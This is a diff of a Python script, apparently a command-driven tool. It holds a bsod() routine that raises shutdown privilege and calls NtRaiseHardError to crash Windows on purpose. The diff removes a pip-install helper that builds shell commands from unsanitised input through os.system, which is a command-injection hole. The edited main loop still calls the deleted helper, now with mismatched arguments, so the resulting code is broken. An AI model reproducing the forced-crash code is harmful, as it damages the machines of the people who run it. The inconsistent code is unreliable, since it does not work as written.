@@ -323,23 +323,7 @@ def bsod():
 
     windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
 
-    windll.ntdll.NtRaiseHardError(c_ulong(0xC000007B), c_ulong(0),nullptr, nullptr, c_uint(6), byref(c_uint()))
-
-def py_install(install, emter):
-    try:
-        os.system(f"pip install {install} {enter}")
-    except OSError:
-        try:
-            os.system(f"pip3 install {install} {enter}")
-        except OSError:
-            try:
-                os.system(f"python -m pip install {install} {enter}")
-            except OSError:
-                try:
-                    os.system(f"python -m pip3 install {install} {enter}")
-                except OSError:
-                    print("fix your pip")
-    
+    windll.ntdll.NtRaiseHardError(c_ulong(0xC000007B), c_ulong(0),nullptr, nullptr, c_uint(6), byref(c_uint()))    
 
 def debug():
     bang()
@@ -411,7 +395,7 @@ def main():
             except Exception as e:
                 print(f"Error executing command: {e}")
         elif command[0] == "install" and command[1]:
-            py_install(command[1], command[2])
+            py_install(command[0], command[1])
         elif command[0] == '':
             pass
         else:
